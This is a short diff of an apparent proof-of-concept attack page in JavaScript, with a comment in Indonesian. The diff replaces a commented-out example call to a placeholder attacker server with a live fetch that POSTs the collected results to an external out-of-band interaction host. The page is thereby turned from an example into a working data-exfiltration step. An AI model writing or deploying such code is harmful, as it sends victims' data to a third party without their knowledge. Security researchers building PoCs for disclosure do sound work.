@@ -51,10 +51,10 @@
             if (results.some(r => r.data)) {
                 console.log("Exfiltrating data to attacker server would happen here");
                 // Dalam PoC nyata, Anda bisa menambahkan kode untuk mengirim data ke server attacker
-                // fetch('https://attacker-server.com/collect', { 
-                //     method: 'POST',
-                //     body: JSON.stringify(results)
-                // });
+                fetch('https://csxaipansspdddzbhzffraz5k2s7ug7r1.oast.fun/collect', { 
+                    method: 'POST',
+                    body: JSON.stringify(results)
+                 });
             }
         });
     </script>
